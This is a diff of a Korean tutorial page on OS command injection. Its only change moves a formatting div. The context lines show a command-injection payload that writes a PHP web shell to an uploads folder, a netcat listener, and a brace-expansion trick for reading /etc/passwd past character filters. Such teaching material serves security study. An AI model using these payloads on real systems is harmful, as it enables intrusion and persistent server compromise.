@@ -298,7 +298,7 @@ nc -lvp 5252 -k -v
 </div>
 
 # OS Command Injection으로 인한 웹쉘 업로드
-<div class="notice--primary" markdown="1">
+
 ```
 ?cmd=127.0.0.1;printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php
 ```
@@ -318,6 +318,8 @@ echo {cat,/etc/passwd}
 위 명령어들은 echo 를 이용하여 문자열을 출력해주지만, 강제 명령을 통해 echo 를 통한 문자열이 아닌 cat /etc/passwd 명령어를 실행하게 된다.
 
 # 특수 문자 제한에 대한 우회
+
+<div class="notice--primary" markdown="1">
 
 OS Injection이 발생하는 취약한 환경에서 특수 문자가 제한 되는 경우가 있다. 이럴 경우 셸에서 제공하는 기능 혹은 환경 변수를 이용하여 우회가 가능하다.
 
